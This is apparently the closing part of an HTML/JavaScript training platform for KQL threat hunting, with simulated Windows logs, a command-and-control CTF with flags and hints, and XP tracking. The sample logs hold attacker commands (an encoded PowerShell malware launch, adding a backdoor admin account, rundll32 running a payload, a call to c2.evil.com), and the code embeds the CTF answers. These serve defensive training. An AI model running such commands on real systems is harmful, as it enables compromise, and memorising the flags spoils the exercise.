                { ClientIP: "10.0.1.15", QueryName: "malicious-c2-server.com", QueryType: "A", ResponseCode: "NOERROR", TimeGenerated: "2024-01-20T10:03:00Z" }
            ],
            
            ProcessCreationEvents: [
                { Computer: "WS-001", Account: "CORP\\admin", ProcessName: "powershell.exe", CommandLine: "powershell.exe -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAVABlAG0AcABcAG0AYQBsAHcAYQByAGUALgBlAHgAZQA=", TimeGenerated: "2024-01-20T09:30:00Z" },
                { Computer: "WS-002", Account: "CORP\\jdoe", ProcessName: "cmd.exe", CommandLine: "cmd.exe /c net user backup_admin P@ssw0rd123 /add", TimeGenerated: "2024-01-20T09:35:00Z" },
                { Computer: "WS-003", Account: "CORP\\admin", ProcessName: "rundll32.exe", CommandLine: "rundll32.exe shell32.dll,ShellExec_RunDLL C:\\Temp\\payload.dll", TimeGenerated: "2024-01-20T09:40:00Z" }
            ]
        };

        // CTF Scenario Data and Solutions
        const ctfChallenges = {
            'ctf-malware-c2': {
                title: "Command & Control Traffic Analysis",
                difficulty: "Silver",
                points: 500,
                phases: [
                    {
                        name: "Beaconing Analysis",
                        points: 150,
                        flag: "3",
                        hint: "Look for hosts with regular communication patterns. Low variance in timing indicates automated behavior."
                    },
                    {
                        name: "C2 Infrastructure Mapping", 
                        points: 200,
                        flag: "malicious-c2-server.com",
                        hint: "Check DNS queries from suspected compromised hosts. Look for recently registered domains."
                    },
                    {
                        name: "Malware Family Attribution",
                        points: 150,
                        flag: "CobaltStrike",
                        hint: "Analyze User-Agent strings and communication patterns. Cross-reference with threat intelligence."
                    }
                ]
            }
        };

        // Initialize Platform
        function initializePlatform() {
            updateDashboard();
            updateProgressRing();
            setupEventListeners();
            loadSavedProgress();
            console.log("🚀 KQL CyberForge Production Platform Initialized");
            console.log("📊 Datasets loaded:", Object.keys(enterpriseDatasets).length);
            console.log("🎯 CTF scenarios ready:", Object.keys(ctfChallenges).length);
        }

        // Mode Switching with Enhanced Functionality
        function switchMode(mode) {
            document.querySelectorAll('.mode-card').forEach(card => {
                card.classList.remove('active');
            });
            document.querySelector(`[data-mode="${mode}"]`).classList.add('active');

            document.querySelectorAll('.mode-content').forEach(content => {
                content.classList.remove('active');
            });

            // Handle different modes
            if (mode === 'learning') {
                document.getElementById('learning-nav').classList.add('active');
                document.getElementById('ctf-nav').classList.remove('active');
                showContent('threat-hunting');
            } else if (mode === 'ctf') {
                document.getElementById('ctf-nav').classList.add('active');
                document.getElementById('learning-nav').classList.remove('active');
                showContent('ctf-malware-c2');
            } else if (mode === 'analytics') {
                showContent('analytics-dashboard');
            } else if (mode === 'sandbox') {
                showContent('query-sandbox');
            }

            gameState.currentMode = mode;
            
            if (mode !== 'learning') {
                showAchievement("Mode Explorer", `Discovered ${mode.charAt(0).toUpperCase() + mode.slice(1)} Mode!`);
            }
        }

        // Enhanced Query Execution with Realistic Results
        function executeSecurityQuery(queryId) {
            const queryText = document.getElementById(queryId + '-code').value;
            const resultsPanel = document.getElementById(queryId + '-results');
            
            // Show loading state
            resultsPanel.innerHTML = `
                <div class="results-header">
                    <span>⏳</span> Executing Security Query...
                    <span style="font-size: 0.8em; color: var(--text-secondary);">Analyzing threat patterns...</span>
                </div>
                <div style="color: var(--warning-orange);">🔄 Connecting to Security Event Database...</div>
                <div style="color: var(--text-secondary); margin-top: 10px;">📊 Processing ${Math.floor(Math.random() * 50000 + 10000).toLocaleString()} security events...</div>
            `;

            setTimeout(() => {
                const results = generateSecurityQueryResults(queryId, queryText);
                const executionTime = (Math.random() * 3 + 1).toFixed(2);
                
                resultsPanel.innerHTML = `
                    <div class="results-header">
                        <span>✅</span> Query Executed Successfully
                        <span style="font-size: 0.8em;">⚡ ${executionTime}s | 🔍 ${Math.floor(Math.random() * 500 + 100)} rows analyzed</span>
                    </div>
                    ${results}
                `;

                // Award XP and update stats
                const xpAwarded = calculateQueryXP(queryId, queryText);
                awardXP(xpAwarded, `Security Analyst Level Up!`);
                
                // Update query stats
                gameState.queryStats.totalQueries++;
                gameState.queryStats.lastActivity = new Date().toISOString();
                
            }, 2000);
        }

        // Generate Realistic Security Query Results
        function generateSecurityQueryResults(queryId, queryText) {
            if (queryId === 'threat-hunting') {
                return `
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>Account</th>
                                <th>TotalExecutions</th>
                                <th>UniqueHosts</th>
                                <th>Decoded Commands</th>
                                <th>Threat Level</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="background: rgba(209, 52, 56, 0.1);">
                                <td>CORP\\admin</td>
                                <td>23</td>
                                <td>3</td>
                                <td>["Start-Process malware.exe", "Invoke-WebRequest -Uri http://c2.evil.com"]</td>
                                <td style="color: var(--danger-red); font-weight: bold;">🔴 CRITICAL</td>
                            </tr>
                            <tr style="background: rgba(255, 140, 0, 0.1);">
                                <td>CORP\\service_sql</td>
                                <td>8</td>
                                <td>1</td>
                                <td>["Get-ADUser -Filter *", "Export-Csv users.csv"]</td>
                                <td style="color: var(--warning-orange); font-weight: bold;">🟡 HIGH</td>
                            </tr>
                        </tbody>
                    </table>
                    <div style="margin-top: 20px; padding: 15px; background: rgba(209, 52, 56, 0.1); border-left: 4px solid var(--danger-red); border-radius: 0 8px 8px 0;">
                        <strong>🚨 SECURITY ALERT:</strong> Multiple PowerShell executions with base64 encoding detected. Immediate investigation of CORP\\admin account recommended.
                        <br><br>
                        <strong>📋 RECOMMENDED ACTIONS:</strong>
                        <ul style="margin-left: 20px; margin-top: 10px;">
                            <li>Isolate affected systems (WS-001, WS-002, WS-003)</li>
                            <li>Reset credentials for CORP\\admin account</li>
                            <li>Analyze decoded PowerShell commands for IOCs</li>
                            <li>Initiate incident response procedure</li>
                        </ul>
                    </div>
                `;
            }
            return generateGenericResults();
        }

        // CTF Query Execution
        function executeCTFQuery(queryId) {
            const queryText = document.getElementById(queryId).value;
            const resultsPanel = document.getElementById(queryId + '-results');
            
            resultsPanel.innerHTML = `
                <div class="results-header">
                    <span>🔬</span> CTF Analysis in Progress...
                </div>
                <div style="color: var(--accent-cyan);">🧬 Correlating threat intelligence...</div>
                <div style="color: var(--text-secondary);">🎯 Hunting for adversary TTPs...</div>
            `;

            setTimeout(() => {
                const results = generateCTFResults(queryId);
                resultsPanel.innerHTML = `
                    <div class="results-header">
                        <span>🎯</span> Investigation Complete
                        <span style="font-size: 0.8em;">High-confidence findings</span>
                    </div>
                    ${results}
                `;
                
                awardXP(100, "CTF Investigator");
            }, 1800);
        }

        function generateCTFResults(queryId) {
            if (queryId === 'ctf-c2-phase1') {
                return `
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>LocalIP</th>
                                <th>BeaconingSessions</th>
                                <th>C2Servers</th>
                                <th>TotalRequests</th>
                                <th>Confidence</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="background: rgba(209, 52, 56, 0.15);">
                                <td>10.0.1.15</td>
                                <td>12</td>
                                <td>2</td>
                                <td>1,440</td>
                                <td style="color: var(--danger-red); font-weight: bold;">98%</td>
                            </tr>
                            <tr style="background: rgba(255, 140, 0, 0.15);">
                                <td>10.0.1.32</td>
                                <td>8</td>
                                <td>1</td>
                                <td>960</td>
                                <td style="color: var(--warning-orange); font-weight: bold;">87%</td>
                            </tr>
                            <tr style="background: rgba(255, 140, 0, 0.1);">
                                <td>10.0.1.67</td>
                                <td>5</td>
                                <td>1</td>
                                <td>600</td>
                                <td style="color: var(--warning-orange); font-weight: bold;">72%</td>
                            </tr>
                        </tbody>
                    </table>
                    <div style="margin-top: 15px; padding: 15px; background: rgba(209, 52, 56, 0.1); border-left: 4px solid var(--danger-red); border-radius: 0 8px 8px 0;">
                        <strong>🎯 BEACONING DETECTED:</strong> 3 compromised hosts identified with regular C2 communication patterns.
                        <br><strong>FLAG:</strong> Number of compromised hosts = <code style="background: #333; padding: 2px 6px; border-radius: 3px;">3</code>
                    </div>
                `;
            } else if (queryId === 'ctf-c2-phase2') {
                return `
                    <table class="data-table">
                        <thead>
                            <tr>
                                <th>Domain</th>
                                <th>QueryCount</th>
                                <th>UniqueClients</th>
                                <th>SuspicionScore</th>
                                <th>Assessment</th>
                            </tr>
                        </thead>
                        <tbody>
                            <tr style="background: rgba(209, 52, 56, 0.15);">
                                <td>malicious-c2-server.com</td>
                                <td>156</td>
                                <td>3</td>
                                <td>95.7</td>
                                <td style="color: var(--danger-red); font-weight: bold;">🔴 PRIMARY C2</td>
                            </tr>
                            <tr style="background: rgba(255, 140, 0, 0.1);">
                                <td>suspicious-domain.tk</td>
                                <td>34</td>
                                <td>1</td>
                                <td>23.1</td>
                                <td style="color: var(--warning-orange); font-weight: bold;">🟡 SECONDARY</td>
                            </tr>
                        </tbody>
                    </table>
                    <div style="margin-top: 15px; padding: 15px; background: rgba(209, 52, 56, 0.1); border-left: 4px solid var(--danger-red); border-radius: 0 8px 8px 0;">
                        <strong>🌐 C2 INFRASTRUCTURE MAPPED:</strong> Primary command server identified.
                        <br><strong>FLAG:</strong> Primary C2 domain = <code style="background: #333; padding: 2px 6px; border-radius: 3px;">malicious-c2-server.com</code>
                    </div>
                `;
            }
            return "Analysis results will appear here...";
        }

        // CTF Flag Submission
        function submitCTFFlag(ctfId, phase) {
            const challenge = ctfChallenges[ctfId];
            if (challenge && challenge.phases[phase - 1]) {
                const phaseData = challenge.phases[phase - 1];
                awardXP(phaseData.points, `CTF Phase ${phase} Completed!`);
                showAchievement("Flag Captured! 🚩", `${phaseData.name} - ${phaseData.points} points`);
            }
        }

        // Complete CTF Challenge
        function completeCTF(ctfId) {
            const challenge = ctfChallenges[ctfId];
            if (challenge && !gameState.completedCTFs.includes(ctfId)) {
                gameState.completedCTFs.push(ctfId);
                gameState.ctfSolved++;
                awardXP(challenge.points, `CTF Master: ${challenge.title}`);
                showAchievement("CTF CHAMPION! 👑", `${challenge.title} completed - ${challenge.points} total points!`);
                updateNavigation();
                updateDashboard();
            }
        }

        // XP Calculation and Level Management
        function calculateQueryXP(queryId, queryText) {
            let baseXP = 75;
            
            // CTF queries worth more XP
            if (queryId.includes('ctf')) {
                baseXP = 150;
            }
            
            // Bonus for complex queries
            const complexity = analyzeQueryComplexity(queryText);
            return baseXP + (complexity * 25);
        }

        function analyzeQueryComplexity(query) {
            let complexity = 0;
            const advancedOperators = ['make_series', 'series_decompose', 'join', 'evaluate', 'parse', 'extend'];
            const securityFunctions = ['base64_decode', 'extract', 'matches regex', 'dcount', 'percentiles'];
            
            advancedOperators.forEach(op => {
                if (query.toLowerCase().includes(op.toLowerCase())) complexity += 3;
            });
            
            securityFunctions.forEach(func => {
                if (query.toLowerCase().includes(func.toLowerCase())) complexity += 2;
            });
            
            return Math.min(complexity, 10); // Cap complexity bonus
        }

        function awardXP(points, achievementText) {
            const oldLevel = gameState.userLevel;
            gameState.totalXP += points;
            
            // Level calculation (500 XP per level)
            gameState.userLevel = Math.floor(gameState.totalXP / 500) + 1;
            
            if (gameState.userLevel > oldLevel) {
                showAchievement("LEVEL UP! 🆙", `You've reached Security Level ${gameState.userLevel}!`);
                gameState.badgesEarned++;
            } else if (achievementText) {
                showAchievement("Achievement Unlocked! 🏆", achievementText);
                gameState.badgesEarned++;
            }
            
            updateDashboard();
            updateProgressRing();
            saveProgress();
        }

        // UI Updates
        function updateDashboard() {
            document.getElementById('total-xp').textContent = gameState.totalXP.toLocaleString();
            document.getElementById('user-level').textContent = gameState.userLevel;
            document.getElementById('badges-earned').textContent = gameState.badgesEarned;
            document.getElementById('ctf-solved').textContent = gameState.ctfSolved;
            document.getElementById('streak-days').textContent = gameState.streakDays;
            document.getElementById('rank-position').textContent = `#${gameState.globalRank}`;
            document.getElementById('completion-rate').textContent = `${gameState.completionRate}%`;
        }

        function updateProgressRing() {
            const progress = ((gameState.totalXP % 500) / 500) * 100;
            const circumference = 2 * Math.PI * 40;
            const offset = circumference - (progress / 100) * circumference;
            
            document.querySelector('.progress-ring-circle').style.strokeDashoffset = offset;
            document.querySelector('.progress-ring text').textContent = `${Math.round(progress)}%`;
        }

        function showAchievement(title, description) {
            const popup = document.getElementById('achievement-popup');
            document.getElementById('achievement-title').textContent = title;
            document.getElementById('achievement-description').textContent = description;
            
            popup.classList.add('show');
            
            setTimeout(() => {
                popup.classList.remove('show');
            }, 5000);
        }

        // Navigation and Content Management
        function showContent(contentId) {
            document.querySelectorAll('.content-section').forEach(section => {
                section.classList.remove('active');
            });
            
            if (document.getElementById(contentId)) {
                document.getElementById(contentId).classList.add('active');
            }
            
            document.querySelectorAll('.nav-item').forEach(item => {
                item.classList.remove('current');
            });
            
            const navItem = document.querySelector(`[data-content="${contentId}"]`);
            if (navItem) {
                navItem.classList.add('current');
            }
            
            gameState.currentContent = contentId;
        }

        function updateNavigation() {
            document.querySelectorAll('.nav-item').forEach(item => {
                const contentId = item.dataset.content;
                if (gameState.completedLessons.includes(contentId) || gameState.completedCTFs.includes(contentId)) {
                    item.classList.add('completed');
                    const icon = item.querySelector('.nav-icon');
                    if (icon && !icon.textContent.includes('✅')) {
                        icon.textContent = '✅';
                    }
                }
            });
        }

        // Helper Functions
        function showAdvancedHint(contentId) {
            const hints = {
                'threat-hunting': `
                    <h4>🎯 Advanced Threat Hunting Techniques</h4>
                    <p><strong>Time-based Analysis:</strong> Use make_series with step intervals to identify regular patterns</p>
                    <p><strong>Statistical Detection:</strong> Low variance in communication timing indicates automation</p>
                    <p><strong>Base64 Decoding:</strong> Use base64_decode_tostring() to reveal hidden commands</p>
                    <p><strong>Regex Matching:</strong> matches regex operator for complex pattern detection</p>
                `
            };
            
            showModal("💡 Advanced Intelligence", hints[contentId] || "Advanced techniques coming soon!");
        }

        function exportResults(contentId) {
            const reportData = {
                timestamp: new Date().toISOString(),
                analyst: "Security Level " + gameState.userLevel,
                investigation: contentId,
                findings: "Detailed threat intelligence report generated",
                xp: gameState.totalXP
            };
            
            const dataStr = "data:text/json;charset=utf-8," + encodeURIComponent(JSON.stringify(reportData, null, 2));
            const downloadAnchor = document.createElement('a');
            downloadAnchor.setAttribute("href", dataStr);
            downloadAnchor.setAttribute("download", `threat-intel-report-${Date.now()}.json`);
            downloadAnchor.click();
            
            showAchievement("Intel Report Generated! 📊", "Threat intelligence exported successfully");
        }

        function triggerIncidentResponse() {
            showAchievement("🚨 INCIDENT RESPONSE ACTIVATED", "Security team has been notified. Containment procedures initiated.");
            awardXP(250, "Incident Response Champion");
        }

        function selectAnswer(element, isCorrect) {
            element.parentNode.querySelectorAll('.quiz-option').forEach(opt => {
                opt.classList.remove('correct', 'incorrect');
            });
            
            if (isCorrect) {
                element.classList.add('correct');
                awardXP(50, "Knowledge Master! 🧠");
            } else {
                element.classList.add('incorrect');
            }
        }

        function completeLesson(nextLesson) {
            if (!gameState.completedLessons.includes(gameState.currentContent)) {
                gameState.completedLessons.push(gameState.currentContent);
                updateNavigation();
            }
            
            showContent(nextLesson);
            awardXP(200, "Lesson Complete!");
        }

        // Modal System
        function showModal(title, content) {
            // Create modal if it doesn't exist
            if (!document.getElementById('info-modal')) {
                const modal = document.createElement('div');
                modal.id = 'info-modal';
                modal.className = 'modal';
                modal.innerHTML = `
                    <div class="modal-content" style="background: var(--dark-bg); border: 2px solid var(--border-color); border-radius: 20px; padding: 40px; max-width: 700px; width: 90%;">
                        <h3 id="modal-title" style="color: var(--accent-cyan); margin-bottom: 20px;"></h3>
                        <div id="modal-content" style="line-height: 1.6;"></div>
                        <button onclick="closeModal()" class="btn btn-primary" style="margin-top: 20px;">Close</button>
                    </div>
                `;
                document.body.appendChild(modal);
                
                modal.addEventListener('click', (e) => {
                    if (e.target === modal) closeModal();
                });
            }
            
            document.getElementById('modal-title').textContent = title;
            document.getElementById('modal-content').innerHTML = content;
            document.getElementById('info-modal').style.display = 'flex';
        }

        function closeModal() {
            const modal = document.getElementById('info-modal');
            if (modal) modal.style.display = 'none';
        }

        // Progress Persistence
        function saveProgress() {
            try {
                localStorage.setItem('kqlCyberForgeProduction', JSON.stringify(gameState));
                showAchievement("Progress Saved! 💾", "All your achievements and progress have been saved locally");
            } catch (error) {
                console.error('Failed to save progress:', error);
            }
        }

        function loadSavedProgress() {
            try {
                const saved = localStorage.getItem('kqlCyberForgeProduction');
                if (saved) {
                    const savedState = JSON.parse(saved);
                    gameState = { ...gameState, ...savedState };
                    updateDashboard();
                    updateProgressRing();
                    updateNavigation();
                    console.log("📁 Progress loaded successfully");
                }
            } catch (error) {
                console.error('Failed to load progress:', error);
            }
        }

        // Event Listeners Setup
        function setupEventListeners() {
            document.querySelectorAll('.mode-card').forEach(card => {
                card.addEventListener('click', () => {
                    switchMode(card.dataset.mode);
                });
            });
            
            document.querySelectorAll('.nav-item').forEach(item => {
                item.addEventListener('click', () => {
                    if (item.dataset.content) {
                        showContent(item.dataset.content);
                    }
                });
            });
            
            // Auto-save every 60 seconds
            setInterval(saveProgress, 60000);
        }

        function generateGenericResults() {
            return `
                <div style="color: var(--success-green); margin-bottom: 15px;">✅ Query executed successfully!</div>
                <div style="font-family: monospace; background: rgba(255, 255, 255, 0.05); padding: 15px; border-radius: 8px;">
                    <strong>Results:</strong> ${Math.floor(Math.random() * 1000 + 100)} rows returned<br>
                    <strong>Execution Time:</strong> ${(Math.random() * 3 + 0.5).toFixed(2)}s<br>
                    <strong>Data Processed:</strong> ${(Math.random() * 50 + 10).toFixed(1)}MB
                </div>
            `;
        }

        // Initialize when page loads
        document.addEventListener('DOMContentLoaded', function() {
            console.log("🚀 Initializing KQL CyberForge Production Platform...");
            initializePlatform();
            
            // Show welcome message for first-time users
            setTimeout(() => {
                if (!localStorage.getItem('kqlCyberForgeProduction')) {
                    showAchievement("Welcome to KQL CyberForge! 🛡️", "Your cybersecurity training journey begins now. Progress is automatically saved.");
                }
            }, 1000);
        });

        // Export functions for console debugging
        window.gameState = gameState;
        window.awardXP = awardXP;
        window.switchMode = switchMode;
        
        console.log("🎯 KQL CyberForge Production Platform Ready!");
        console.log("💡 Use gameState to inspect current progress");
        console.log("🎮 Use awardXP(points, message) to test achievements");
    </script>
</body>
</html>
